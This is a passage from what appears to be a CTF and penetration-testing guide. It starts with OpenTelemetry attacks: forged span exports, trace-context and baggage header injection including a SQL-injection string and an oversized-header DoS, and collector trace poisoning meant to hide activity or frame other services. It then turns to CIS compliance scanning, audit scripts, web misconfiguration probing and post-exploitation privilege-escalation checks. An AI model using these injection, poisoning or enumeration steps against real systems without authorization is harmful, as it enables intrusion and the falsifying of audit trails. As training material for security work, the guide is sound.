            value=common_pb2.AnyValue(string_value="postgresql")
        ),
        common_pb2.KeyValue(
            key="db.statement",
            value=common_pb2.AnyValue(string_value="SELECT * FROM users WHERE role='admin'")
        ),
        common_pb2.KeyValue(
            key="db.user",
            value=common_pb2.AnyValue(string_value="admin")
        )
    ]
)

# Create resource
resource = resource_pb2.Resource(
    attributes=[
        common_pb2.KeyValue(
            key="service.name",
            value=common_pb2.AnyValue(string_value="attacker-service")
        )
    ]
)

# Create request
request = trace_service_pb2.ExportTraceServiceRequest(
    resource_spans=[
        trace_pb2.ResourceSpans(
            resource=resource,
            scope_spans=[
                trace_pb2.ScopeSpans(
                    spans=[span]
                )
            ]
        )
    ]
)

# Send request
try:
    response = stub.Export(request)
    print(f"Export successful: {response}")
except grpc.RpcError as e:
    print(f"Error: {e.code()} - {e.details()}")
```

**Collector Configuration Exploitation**

```bash
# If collector config is exposed (e.g., via ConfigMap in K8s)
kubectl get configmap otel-collector-config -o yaml

# Look for:
# - Exporters (where data goes)
# - Receivers (where data comes from)
# - Processors (data transformation)
# - Extensions (additional features)

# Check for insecure configurations
# [Unverified] Common misconfigurations include:
# - Unauthenticated receivers
# - Exporters to attacker-controlled endpoints
# - Disabled sampling (full data collection)
# - Verbose logging with sensitive data
```

### Context Propagation Attacks

**Trace Context Header Injection**

```bash
# W3C Trace Context headers
# traceparent: 00-[trace-id]-[parent-id]-[flags]
# tracestate: [vendor]=[value]

# Inject malicious trace context
curl https://api.example.com/endpoint \
  -H "traceparent: 00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01" \
  -H "tracestate: attacker=malicious_value,rojo=00f067aa0ba902b7"

# B3 propagation (Zipkin)
curl https://api.example.com/endpoint \
  -H "X-B3-TraceId: 80f198ee56343ba864fe8b2a57d3eff7" \
  -H "X-B3-SpanId: e457b5a2e4d86bd1" \
  -H "X-B3-ParentSpanId: 05e3ac9a4f6e3b90" \
  -H "X-B3-Sampled: 1"

# Inject with large baggage (potential DoS)
curl https://api.example.com/endpoint \
  -H "baggage: $(python3 -c 'print("key=" + "A"*8000)')"
```

**Baggage Exploitation**

```python
from opentelemetry import baggage
from opentelemetry import trace
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import ConsoleSpanExporter, BatchSpanExporter
import requests

# Set up tracer
trace.set_tracer_provider(TracerProvider())
tracer = trace.get_tracer(__name__)

# Set malicious baggage
ctx = baggage.set_baggage("user_id", "admin")
ctx = baggage.set_baggage("role", "administrator", context=ctx)
ctx = baggage.set_baggage("sql_injection", "' OR '1'='1", context=ctx)

# Make request with propagated context
with tracer.start_as_current_span("malicious_request", context=ctx):
    # Baggage will be propagated in headers
    response = requests.get("https://api.example.com/endpoint")
    
# [Inference] If downstream services trust baggage values without validation,
# they may use them in security decisions or database queries
```

**Cross-Service Trace Poisoning**

```python
import requests
import json

# Scenario: Service A calls Service B
# Attacker controls call to Service A
# Goal: Poison traces to hide malicious activity or frame legitimate services

def poison_trace():
    # Create trace with legitimate-looking parent
    # but inject malicious child spans
    
    malicious_trace = {
        "traceId": "legitimate-trace-id-from-victim",
        "spans": [
            {
                "spanId": "attacker-span-001",
                "parentSpanId": "legitimate-parent-span",
                "name": "legitimate_operation",
                "tags": {
                    "component": "trusted-service",
                    "http.status_code": 200,
                    "success": "true"
                },
                # Hide actual malicious activity
                "logs": []
            }
        ]
    }
    
    # Send to collector
    requests.post(
        "http://collector.example.com:4318/v1/traces",
        json=malicious_trace
    )

# [Inference] This can be used to:
# - Hide malicious operations in legitimate traces
# - Create false audit trails
# - Blame other services for attacker actions
```

---

## Important Related Topics

- **Message queue ACL bypass**: Exploiting misconfigured access controls on queue/topic resources
- **Event replay attacks**: Capturing and replaying events to trigger duplicate actions
- **Distributed transaction exploitation**: Attacking saga patterns and two-phase commit mechanisms
- **Service mesh security**: Exploiting sidecar proxies and control plane misconfigurations
- **Observability backend attacks**: Targeting Prometheus, Grafana, and ELK stacks that store trace data

---

# Compliance & Misconfiguration Scanning

## Overview

Compliance and misconfiguration scanning identifies deviations from security baselines, industry standards, and best practices. In CTF contexts, these scanners reveal configuration weaknesses that enable privilege escalation, lateral movement, or data exfiltration. This phase bridges initial reconnaissance with exploitation by mapping the gap between intended and actual security posture.

## CIS Benchmark Violations

### Understanding CIS Benchmarks

CIS (Center for Internet Security) Benchmarks are consensus-based security configuration guidelines for systems, software, networks, and cloud environments. Each benchmark contains hundreds of configuration recommendations organized by impact level (Level 1: basic hardening, Level 2: enhanced security).

**Common Violation Categories:**

- Authentication controls (password policies, account lockout)
- Service configuration (unnecessary services enabled)
- Filesystem permissions and ownership
- Audit logging and monitoring gaps
- Network parameter misconfigurations
- Encryption requirements not met

### Tools for CIS Assessment

#### Lynis

Enterprise-grade auditing tool for Unix/Linux systems with extensive CIS checking capabilities.

```bash
# Basic system audit
lynis audit system

# Generate detailed compliance report
lynis audit system --quick --report-file /tmp/lynis-report.dat

# Test specific category
lynis audit system --tests-from-group authentication

# Check specific CIS controls only
lynis audit system --tests "AUTH-9262,AUTH-9264,AUTH-9286"

# Cronjob-friendly mode with warnings only
lynis audit system --cronjob --warnings-only
```

**Key Lynis Output Sections:**

- **Hardening index**: Numerical score (0-100) indicating overall security posture
- **Suggestions**: Prioritized remediation recommendations
- **Warnings**: Critical security issues requiring immediate attention

**CTF Application:** Parse Lynis output for quick wins - look for weak password policies, world-writable files, SUID binaries with known vulnerabilities, and disabled SELinux/AppArmor.

#### OpenSCAP

SCAP (Security Content Automation Protocol) implementation supporting multiple compliance frameworks.

```bash
# Install OpenSCAP on Kali
apt-get install libopenscap8 openscap-utils scap-security-guide

# List available profiles for Ubuntu 20.04
oscap info /usr/share/xml/scap/ssg/content/ssg-ubuntu2004-ds.xml

# Run CIS Level 1 Server scan
oscap xccdf eval \
  --profile xccdf_org.ssgproject.content_profile_cis_level1_server \
  --results scan-results.xml \
  --report scan-report.html \
  /usr/share/xml/scap/ssg/content/ssg-ubuntu2004-ds.xml

# Generate compliance report with remediation
oscap xccdf generate fix \
  --profile xccdf_org.ssgproject.content_profile_cis \
  --fix-type bash \
  --output remediation.sh \
  scan-results.xml
```

**Available Profiles (Distribution Dependent):**

- `cis` - CIS Benchmark baseline
- `cis_level1_server` - CIS Level 1 Server
- `cis_level2_workstation` - CIS Level 2 Workstation
- `pci-dss` - PCI DSS compliance
- `stig` - DISA STIG requirements

**CTF Value:** SCAP reports identify exact configuration parameters deviating from secure baselines. Check remediation scripts for misconfigurations that could be exploited (e.g., weak umask, insecure service bindings).

#### CIS-CAT Lite (Manual Download Required)

CIS-CAT Lite is the free version of CIS's official assessment tool. [Unverified: Requires free CIS SecureSuite membership for download]

```bash
# Extract downloaded CIS-CAT
unzip Assessor-CLI.zip
cd Assessor-CLI

# List available benchmarks
sh ./Assessor-CLI.sh -l

# Assess against CIS Ubuntu Linux 20.04 Benchmark Level 1
sh ./Assessor-CLI.sh -i \
  -rd /tmp/cis-results \
  -nts \
  -rp index \
  -b benchmarks/CIS_Ubuntu_Linux_20.04_LTS_Benchmark_v1.0.0-xccdf.xml \
  -p "Level 1 - Server"

# Export results as HTML
sh ./Assessor-CLI.sh -html -rd /tmp/cis-results
```

**Output Formats:**

- HTML - Human-readable report with pass/fail per control
- CSV - Parseable results for automation
- XML - Full SCAP-compatible output

#### Linux Security Auditing (Custom Scripts)

```bash
#!/bin/bash
# Quick CIS violation checker for Linux

echo "[*] Checking password policies..."
grep -E '(PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_MIN_LEN|PASS_WARN_AGE)' /etc/login.defs

echo "[*] Checking for accounts with empty passwords..."
awk -F: '($2 == "") {print $1}' /etc/shadow

echo "[*] Checking world-writable files..."
find / -xdev -type f -perm -0002 -ls 2>/dev/null

echo "[*] Checking SUID/SGID binaries..."
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -ls 2>/dev/null

echo "[*] Checking running services..."
systemctl list-units --type=service --state=running

echo "[*] Checking listening ports..."
ss -tulpn

echo "[*] Checking for unowned files..."
find / -xdev \( -nouser -o -nogroup \) -ls 2>/dev/null

echo "[*] Checking kernel parameters..."
sysctl -a | grep -E '(net.ipv4.conf.all.accept_source_route|net.ipv4.conf.all.send_redirects|net.ipv4.icmp_echo_ignore_broadcasts)'

echo "[*] Checking audit configuration..."
auditctl -l
```

### Common CIS Violations in CTFs

**Authentication (1.x Controls):**

```bash
# Check password policy weaknesses
grep PASS /etc/login.defs | grep -v "^#"

# Identify accounts without password aging
awk -F: '($5 > 90 || $5 == "") {print $1}' /etc/shadow

# Find users with UID 0 (besides root)
awk -F: '($3 == "0") {print}' /etc/passwd
```

**Filesystem (2.x Controls):**

```bash
# Detect separate /tmp partition violations
mount | grep -E '\s/tmp\s'

# Check /tmp mount options (should have nodev,nosuid,noexec)
mount | grep '\s/tmp\s' | grep -oE '(nodev|nosuid|noexec)'

# Find globally writable directories without sticky bit
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -ls 2>/dev/null
```

**Service Configuration (3.x Controls):**

```bash
# Check for legacy services
systemctl list-unit-files | grep -E '(telnet|rsh|rlogin|tftp|talk)'

# Verify SSH hardening
sshd -T | grep -E '(Protocol|PermitRootLogin|PermitEmptyPasswords|PasswordAuthentication)'

# Check for unnecessary xinetd services
ls -la /etc/xinetd.d/
```

## Compliance Framework Mapping

### Framework Overview

Different compliance frameworks emphasize different security aspects. Understanding mapping helps identify which violations matter most for specific contexts.

**Major Frameworks:**

1. **PCI DSS (Payment Card Industry)**
    
    - Focus: Cardholder data protection
    - Key Areas: Network segmentation, encryption, access control, monitoring
    - Relevant Tools: `oscap`, `nmap` (for segmentation testing), log analysis tools
2. **HIPAA (Healthcare)**
    
    - Focus: Protected Health Information (PHI) confidentiality
    - Key Areas: Access control, audit trails, encryption, transmission security
    - Relevant Tools: File permission scanners, encryption validation, log auditing
3. **NIST Cybersecurity Framework**
    
    - Focus: Risk management approach (Identify, Protect, Detect, Respond, Recover)
    - Key Areas: Asset management, data security, anomaly detection
    - Relevant Tools: Vulnerability scanners, SIEM correlation, inventory tools
4. **ISO 27001**
    
    - Focus: Information Security Management System (ISMS)
    - Key Areas: Risk assessment, control implementation, continuous improvement
    - Relevant Tools: Comprehensive audit platforms, documentation review
5. **GDPR (Data Protection)**
    
    - Focus: Personal data processing and privacy
    - Key Areas: Data minimization, purpose limitation, access rights, breach notification
    - Relevant Tools: Data discovery tools, access control audits, encryption verification

### Mapping Tools and Techniques

#### OpenSCAP Profile Mapping

OpenSCAP content includes pre-mapped profiles:

```bash
# View profile details and mapped frameworks
oscap info /usr/share/xml/scap/ssg/content/ssg-ubuntu2004-ds.xml \
  | grep -A 20 "Profile:"

# Run PCI-DSS specific scan
oscap xccdf eval \
  --profile xccdf_org.ssgproject.content_profile_pci-dss \
  --results pci-results.xml \
  --report pci-report.html \
  /usr/share/xml/scap/ssg/content/ssg-ubuntu2004-ds.xml

# Extract only failed PCI controls
oscap xccdf generate report pci-results.xml | \
  grep -A 5 "fail"
```

#### Custom Mapping Script

```python
#!/usr/bin/env python3
# Framework mapper - correlate findings to compliance requirements

import xml.etree.ElementTree as ET
import sys

# Simplified mapping (expand based on actual framework requirements)
FRAMEWORK_MAP = {
    'PCI-DSS': {
        '2.2': ['Disable unnecessary services', 'Change vendor defaults'],
        '8.2': ['Password complexity', 'Account lockout'],
        '10.2': ['Audit trail for all access', 'Log security events'],
    },
    'NIST-800-53': {
        'AC-2': ['Account management', 'Automated account actions'],
        'AU-2': ['Audit events logging', 'System auditing'],
        'SC-7': ['Boundary protection', 'Network segmentation'],
    }
}

def parse_oscap_results(xml_file):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    failed_rules = []
    for result in root.findall('.//{http://checklists.nist.gov/xccdf/1.2}rule-result'):
        rule_id = result.find('{http://checklists.nist.gov/xccdf/1.2}idref').text
        result_status = result.find('{http://checklists.nist.gov/xccdf/1.2}result').text
        
        if result_status == 'fail':
            failed_rules.append(rule_id)
    
    return failed_rules

def map_to_framework(failed_rules, framework='PCI-DSS'):
    print(f"\n[*] Mapping to {framework} controls:\n")
    
    # [Inference: This is a simplified example. Real mapping requires detailed control analysis]
    for rule in failed_rules:
        print(f"Failed Rule: {rule}")
        # Actual implementation would require comprehensive control database
        print(f"  -> Potential {framework} Impact: [Manual review required]\n")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <oscap-results.xml>")
        sys.exit(1)
    
    results_file = sys.argv[1]
    failed = parse_oscap_results(results_file)
    
    print(f"[*] Found {len(failed)} failed controls")
    map_to_framework(failed, 'PCI-DSS')
```

### Crosswalk Resources

[Inference: These resources typically provide compliance framework mappings]

**Manual Crosswalk Lookup:**

- CIS Controls v8 to NIST CSF: Compare control objectives manually
- NIST 800-53 to ISO 27001: Use NIST SP 800-53A crosswalk appendices
- PCI DSS to CIS: Leverage official PCI mapping documents

**Command for Quick Reference:**

```bash
# Extract control descriptions from SCAP content
oscap xccdf generate guide \
  /usr/share/xml/scap/ssg/content/ssg-ubuntu2004-ds.xml > guide.html

# Parse for specific framework references
grep -i "PCI\|NIST\|ISO" guide.html | sort -u
```

## Security Posture Assessment

### Automated Assessment Platforms

#### Nessus (Tenable)

Professional vulnerability scanner with compliance auditing capabilities. [Unverified: Requires commercial license for full features; Nessus Essentials provides limited free scanning]

```bash
# Nessus CLI (requires daemon running)
# Note: Typically controlled via web UI at https://localhost:8834

# Nessus API interaction (requires API keys)
curl -k -X GET https://localhost:8834/scans \
  -H "X-ApiKeys: accessKey=ACCESSKEY;secretKey=SECRETKEY"

# Export compliance scan results
curl -k -X GET \
  "https://localhost:8834/scans/{scan_id}/export/{file_id}/download" \
  -H "X-ApiKeys: accessKey=ACCESSKEY;secretKey=SECRETKEY" \
  -o compliance-report.pdf
```

**Compliance Audit Templates:**

- CIS Ubuntu Linux Benchmark
- DISA STIG for RHEL
- PCI DSS compliance scanning
- HIPAA configuration audit

#### OpenVAS (Greenbone)

Open-source vulnerability scanner with compliance scanning capabilities.

```bash
# Install OpenVAS on Kali
apt-get install openvas
gvm-setup
gvm-check-setup

# Start services
gvm-start

# Access web interface at https://127.0.0.1:9392
# Default credentials: admin / (password set during gvm-setup)

# CLI management via gvm-cli (requires Python gvm-tools)
pip3 install gvm-tools

# List scan configs
gvm-cli --gmp-username admin --gmp-password <password> socket --xml "<get_configs/>"

# Create compliance scan
gvm-cli socket --gmp-username admin --gmp-password <password> \
  --xml "<create_task>
    <name>CIS Compliance Scan</name>
    <config id='config-id-here'/>
    <target id='target-id-here'/>
  </create_task>"
```

#### Docker-Based Assessment Environments

```bash
# Run vulnerability scanner in Docker
docker run -d -p 8080:8080 \
  --name openvas \
  mikesplain/openvas

# Run compliance checker container
docker run --rm -v /:/rootfs:ro \
  aquasec/trivy rootfs --severity HIGH,CRITICAL /rootfs

# Docker Bench for Security (CIS Docker Benchmark)
docker run --rm --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security
```

### Manual Posture Assessment

#### System Hardening Checklist

```bash
#!/bin/bash
# Comprehensive security posture checker

echo "=== SYSTEM HARDENING ASSESSMENT ==="

# 1. Account Security
echo -e "\n[1] Account Security"
echo "Users with UID 0:"
awk -F: '($3 == "0") {print $1}' /etc/passwd

echo -e "\nAccounts without passwords:"
awk -F: '($2 == "" || $2 == "!") {print $1}' /etc/shadow 2>/dev/null

echo -e "\nPassword aging for critical accounts:"
chage -l root

# 2. Service Exposure
echo -e "\n[2] Service Exposure"
echo "Listening services:"
ss -tulpn | grep LISTEN

echo -e "\nEnabled systemd services:"
systemctl list-unit-files --state=enabled --type=service

# 3. Filesystem Security
echo -e "\n[3] Filesystem Security"
echo "World-writable files in /etc:"
find /etc -xdev -type f -perm -0002 -ls 2>/dev/null

echo -e "\nSUID/SGID binaries:"
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

echo -e "\nUnowned files:"
find / -xdev \( -nouser -o -nogroup \) 2>/dev/null

# 4. Network Configuration
echo -e "\n[4] Network Configuration"
echo "IP forwarding status:"
sysctl net.ipv4.ip_forward

echo -e "\nSYN cookies:"
sysctl net.ipv4.tcp_syncookies

echo -e "\nICMP redirect acceptance:"
sysctl net.ipv4.conf.all.accept_redirects

# 5. Firewall Status
echo -e "\n[5] Firewall Status"
if command -v ufw &> /dev/null; then
    ufw status verbose
elif command -v firewall-cmd &> /dev/null; then
    firewall-cmd --list-all
else
    iptables -L -n -v
fi

# 6. Logging and Auditing
echo -e "\n[6] Logging and Auditing"
echo "Auditd status:"
systemctl status auditd --no-pager

echo -e "\nAudit rules:"
auditctl -l

echo -e "\nRsyslog configuration:"
grep -v "^#\|^$" /etc/rsyslog.conf

# 7. Kernel Hardening
echo -e "\n[7] Kernel Hardening"
echo "ASLR status:"
cat /proc/sys/kernel/randomize_va_space

echo -e "\nKernel pointer restriction:"
cat /proc/sys/kernel/kptr_restrict

echo -e "\nDmesg restriction:"
cat /proc/sys/kernel/dmesg_restrict

# 8. SELinux/AppArmor
echo -e "\n[8] Mandatory Access Control"
if command -v getenforce &> /dev/null; then
    echo "SELinux status:"
    getenforce
    sestatus
elif command -v apparmor_status &> /dev/null; then
    echo "AppArmor status:"
    apparmor_status
fi

# 9. Patch Status
echo -e "\n[9] Patch Status"
if command -v apt &> /dev/null; then
    echo "Upgradable packages:"
    apt list --upgradable 2>/dev/null | wc -l
elif command -v yum &> /dev/null; then
    echo "Available updates:"
    yum check-update 2>/dev/null | grep -v "^$" | wc -l
fi

# 10. Critical File Permissions
echo -e "\n[10] Critical File Permissions"
echo "/etc/passwd permissions:"
ls -l /etc/passwd

echo "/etc/shadow permissions:"
ls -l /etc/shadow

echo "/boot permissions:"
ls -ld /boot

echo "SSH configuration:"
ls -l /etc/ssh/sshd_config

echo -e "\n=== ASSESSMENT COMPLETE ==="
```

#### Network Segmentation Testing

```bash
# Test network segmentation compliance
# Assumes you have identified expected isolation boundaries

# 1. Test VLAN isolation
ping -c 3 <IP_in_different_VLAN>

# 2. Test firewall rules
nmap -Pn -p- --reason <protected_subnet>

# 3. Test access control between zones
# From DMZ, attempt to reach internal database
nc -zv <internal_db_ip> 3306

# 4. Test egress filtering
curl -I http://example.com
curl -I https://malicious-domain.com

# 5. Verify NAT/routing policies
traceroute <external_destination>
traceroute <internal_restricted_resource>
```

#### Encryption Validation

```bash
# Check SSL/TLS configurations
nmap --script ssl-enum-ciphers -p 443 <target>

# Validate SSH encryption
sshd -T | grep -E '(Ciphers|MACs|KexAlgorithms)'

# Check for weak ciphers
ssh -vv <target> 2>&1 | grep -i cipher

# Verify encrypted filesystems
lsblk -o NAME,FSTYPE,MOUNTPOINT,SIZE | grep -i crypt

# Check for unencrypted sensitive data
grep -r "password\|passwd\|pwd" /etc/ 2>/dev/null | grep -v ".db\|.conf.bak"
```

### Posture Scoring Methodology

[Inference: Scoring methodologies vary by organization but typically follow these patterns]

**Common Scoring Approaches:**

1. **Percentage-Based (CIS-CAT Style)**
    
    - Score = (Passed Controls / Total Controls) × 100
    - Level 1 target: >80%
    - Level 2 target: >90%
2. **Weighted Risk Scoring**
    
    - Critical findings: -10 points each
    - High findings: -5 points each
    - Medium findings: -2 points each
    - Low findings: -1 point each
    - Start from 100, deduct based on findings
3. **CVSS-Based Aggregation**
    
    - Sum CVSS scores of all vulnerabilities
    - Normalize by asset count
    - Apply threshold categories (0-3: Good, 3-6: Fair, 6+: Poor)

**CTF Posture Analysis Script:**

```python
#!/usr/bin/env python3
# Calculate security posture score from scan results

import json
import sys

def calculate_posture_score(findings):
    """
    Calculate weighted posture score
    [Inference: Scoring weights are example values; actual weights depend on risk framework]
    """
    weights = {
        'critical': -15,
        'high': -8,
        'medium': -3,
        'low': -1,
        'info': 0
    }
    
    base_score = 100
    severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
    
    for finding in findings:
        severity = finding.get('severity', 'low').lower()
        if severity in weights:
            base_score += weights[severity]
            severity_counts[severity] += 1
    
    # Ensure score doesn't go negative
    final_score = max(0, base_score)
    
    return final_score, severity_counts

def categorize_posture(score):
    """Categorize security posture based on score"""
    if score >= 85:
        return "EXCELLENT", "Minimal risk exposure"
    elif score >= 70:
        return "GOOD", "Some issues require attention"
    elif score >= 50:
        return "FAIR", "Significant security gaps exist"
    elif score >= 30:
        return "POOR", "Critical vulnerabilities present"
    else:
        return "CRITICAL", "Immediate remediation required"

def main():
    # Example usage - adapt to your scan output format
    findings = [
        {'name': 'Weak SSH config', 'severity': 'high'},
        {'name': 'Unpatched kernel', 'severity': 'critical'},
        {'name': 'World-writable files', 'severity': 'medium'},
        {'name': 'Info disclosure', 'severity': 'low'},
    ]
    
    score, counts = calculate_posture_score(findings)
    category, description = categorize_posture(score)
    
    print(f"\n{'='*50}")
    print(f"SECURITY POSTURE ASSESSMENT")
    print(f"{'='*50}\n")
    print(f"Overall Score: {score}/100")
    print(f"Posture Category: {category}")
    print(f"Assessment: {description}\n")
    print(f"Finding Summary:")
    print(f"  Critical: {counts['critical']}")
    print(f"  High:     {counts['high']}")
    print(f"  Medium:   {counts['medium']}")
    print(f"  Low:      {counts['low']}")
    print(f"  Info:     {counts['info']}\n")
    
    # Prioritization
    if counts['critical'] > 0:
        print("[!] IMMEDIATE ACTION: Address critical findings first")
    elif counts['high'] > 3:
        print("[!] HIGH PRIORITY: Multiple high-severity issues detected")
    else:
        print("[*] Continue systematic remediation of remaining issues")

if __name__ == '__main__':
    main()
```

### CTF-Specific Posture Assessment

**Rapid Enumeration for Misconfigurations:**

```bash
#!/bin/bash
# CTF-optimized misconfiguration finder

TARGET=$1

echo "[*] Running rapid posture assessment on $TARGET"

# Check for common web misconfigurations
echo -e "\n[+] Web Security Headers"
curl -sI $TARGET | grep -iE '(x-frame-options|x-xss-protection|x-content-type|strict-transport|content-security)'

# Check for exposed directories
echo -e "\n[+] Directory Listing Check"
curl -s $TARGET | grep -i "index of"

# Check for default credentials endpoints
echo -e "\n[+] Admin Panels"
for path in admin administrator wp-admin phpmyadmin; do
    code=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/$path)
    if [ "$code" != "404" ]; then
        echo "Found: /$path (HTTP $code)"
    fi
done

# Check for information disclosure
echo -e "\n[+] Information Disclosure"
curl -s $TARGET/robots.txt
curl -s $TARGET/.git/config
curl -s $TARGET/.env

# Check SSL/TLS configuration
echo -e "\n[+] SSL/TLS Validation"
testssl.sh --fast --quiet $TARGET 2>/dev/null | grep -iE '(vulnerable|weak|insecure)'

echo -e "\n[*] Assessment complete"
```

**Post-Exploitation Posture Check:**

```bash
# Once you have shell access, check privilege escalation vectors

# Sudo misconfigurations
sudo -l

# SUID binaries
find / -perm -4000 2>/dev/null

# Writable service files
find /etc/systemd/system -writable 2>/dev/null

# Kernel exploits potential
uname -a
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# Docker escape checks
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv

# Capability misconfigurations
getcap -r / 2>/dev/null
```

---

## Key Takeaways for CTF Scenarios

1. **Prioritize automated scanning** with Lynis and OpenSCAP for quick baseline assessment
2. **Focus on authentication and authorization** violations - highest CTF exploitation success rate
3. **Map findings to frameworks** only when challenge context requires (e.g., "company must be PCI compliant" hint)
4. **Custom scripts beat heavy tools** in time-limited scenarios - know your one-liners
5. **Posture scores guide exploitation path** - low scores indicate multiple potential vectors

## Important Subtopics to Explore

- **Cloud Compliance Scanning** (AWS Config, Azure Security Center, GCP Security Command Center)
- **Container Security Posture** (Docker Bench, Kubernetes CIS benchmarks, Falco runtime detection)
- **Active Directory Compliance** (Bloodhound for misconfigurations, GPO auditing, Kerberos configuration weaknesses)

---

## Configuration Audit

Configuration auditing systematically examines system settings, service configurations, and security controls against established baselines. In CTF environments, configuration audits reveal exploitable deviations from secure defaults that enable initial access, privilege escalation, or persistence.

### Linux System Configuration Audit

#### Core Configuration Files

**Critical Files to Audit:**

```bash
# Authentication and authorization
/etc/passwd          # User account database
/etc/shadow          # Password hashes and aging policies
/etc/group           # Group memberships
/etc/sudoers         # Sudo privilege configuration
/etc/sudoers.d/*     # Additional sudo rules
/etc/pam.d/*         # PAM authentication modules
/etc/security/*      # Security limits and access controls

# Network configuration
/etc/hosts           # Static host mappings
/etc/resolv.conf     # DNS resolver configuration
/etc/sysctl.conf     # Kernel parameters
/etc/sysctl.d/*      # Additional kernel parameter files
/etc/network/interfaces  # Network interface config (Debian)
/etc/sysconfig/network-scripts/*  # Network scripts (RHEL)

# Service configuration
/etc/ssh/sshd_config     # SSH daemon configuration
/etc/apache2/*           # Apache web server
/etc/nginx/*             # Nginx web server
/etc/mysql/*             # MySQL database
/etc/postgresql/*        # PostgreSQL database

# System initialization
/etc/rc.local            # Legacy startup script
/etc/systemd/system/*    # Systemd service units
/etc/init.d/*            # SysV init scripts
/etc/cron.*              # Scheduled tasks
/var/spool/cron/*        # User crontabs

# Security modules
/etc/selinux/config      # SELinux configuration
/etc/apparmor.d/*        # AppArmor profiles
```

#### Automated File Permission Audit

```bash
#!/bin/bash
# Comprehensive file permission auditor

echo "=== FILESYSTEM CONFIGURATION AUDIT ==="

# 1. Critical system files ownership
echo -e "\n[1] Critical File Ownership & Permissions"

check_file_perms() {
    local file=$1
    local expected_owner=$2
    local expected_perms=$3
    
    if [ -f "$file" ]; then
        actual_owner=$(stat -c '%U:%G' "$file")
        actual_perms=$(stat -c '%a' "$file")
        
        echo -n "$file: "
        
        if [ "$actual_owner" != "$expected_owner" ] || [ "$actual_perms" != "$expected_perms" ]; then
            echo "FAIL - Owner: $actual_owner (expected: $expected_owner), Perms: $actual_perms (expected: $expected_perms)"
        else
            echo "PASS"
        fi
    fi
}

# Check critical files
check_file_perms "/etc/passwd" "root:root" "644"
check_file_perms "/etc/shadow" "root:shadow" "640"
check_file_perms "/etc/group" "root:root" "644"
check_file_perms "/etc/gshadow" "root:shadow" "640"
check_file_perms "/etc/ssh/sshd_config" "root:root" "600"
check_file_perms "/boot/grub/grub.cfg" "root:root" "400"

# 2. World-writable files (excluding /tmp, /proc, /sys)
echo -e "\n[2] World-Writable Files (Security Risk)"
find / -xdev -type f -perm -0002 ! -path "/tmp/*" ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" -ls 2>/dev/null | head -20

# 3. World-writable directories without sticky bit
echo -e "\n[3] World-Writable Directories Without Sticky Bit"
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) ! -path "/proc/*" ! -path "/sys/*" -ls 2>/dev/null

# 4. SUID and SGID binaries
echo -e "\n[4] SUID Binaries"
find / -xdev -type f -perm -4000 -ls 2>/dev/null | awk '{print $11, $3, $5}' | column -t

echo -e "\n[5] SGID Binaries"
find / -xdev -type f -perm -2000 -ls 2>/dev/null | awk '{print $11, $3, $5}' | column -t

# 5. Files with no owner
echo -e "\n[6] Unowned Files"
find / -xdev -nouser -ls 2>/dev/null | head -10

echo -e "\n[7] Files with No Group"
find / -xdev -nogroup -ls 2>/dev/null | head -10

# 6. Hidden files in unusual locations
echo -e "\n[8] Hidden Files in System Directories"
find /etc /usr/bin /usr/sbin /opt -name ".*" -type f 2>/dev/null

# 7. Recently modified system files
echo -e "\n[9] Recently Modified System Files (last 7 days)"
find /etc /usr/bin /usr/sbin -type f -mtime -7 -ls 2>/dev/null | head -10

# 8. Files with extended attributes
echo -e "\n[10] Files with Extended Attributes"
find /etc /home -type f -exec lsattr {} \; 2>/dev/null | grep -v '^----' | head -10

echo -e "\n=== AUDIT COMPLETE ==="
```

#### SSH Configuration Audit

SSH misconfigurations are extremely common in CTF scenarios.

```bash
#!/bin/bash
# SSH configuration auditor

SSHD_CONFIG="/etc/ssh/sshd_config"

echo "=== SSH DAEMON CONFIGURATION AUDIT ==="

# Function to check configuration directive
check_ssh_config() {
    local directive=$1
    local expected=$2
    local severity=$3
    
    # Get actual value (handle commented defaults)
    actual=$(sshd -T 2>/dev/null | grep -i "^$directive " | awk '{print $2}')
    
    echo -n "[$severity] $directive: "
    
    if [ "$actual" == "$expected" ]; then
        echo "PASS ($actual)"
    else
        echo "FAIL (current: $actual, expected: $expected)"
    fi
}

# Critical security settings
echo -e "\n[*] Authentication Settings"
check_ssh_config "PermitRootLogin" "no" "CRITICAL"
check_ssh_config "PermitEmptyPasswords" "no" "CRITICAL"
check_ssh_config "PasswordAuthentication" "no" "HIGH"
check_ssh_config "PubkeyAuthentication" "yes" "HIGH"
check_ssh_config "ChallengeResponseAuthentication" "no" "MEDIUM"
check_ssh_config "UsePAM" "yes" "MEDIUM"

echo -e "\n[*] Protocol Settings"
check_ssh_config "Protocol" "2" "CRITICAL"
check_ssh_config "Port" "22" "INFO"  # Non-standard ports are security through obscurity

echo -e "\n[*] Encryption Settings"
# Check for weak ciphers
echo "[HIGH] Checking for weak ciphers:"
sshd -T 2>/dev/null | grep -i ciphers | grep -Eo '(arcfour|des|3des-cbc)' && echo "FAIL: Weak ciphers enabled" || echo "PASS: No weak ciphers detected"

# Check for weak MACs
echo "[HIGH] Checking for weak MACs:"
sshd -T 2>/dev/null | grep -i macs | grep -Eo '(md5|96)' && echo "FAIL: Weak MACs enabled" || echo "PASS: No weak MACs detected"

echo -e "\n[*] Access Control"
check_ssh_config "AllowUsers" "" "INFO"
check_ssh_config "AllowGroups" "" "INFO"
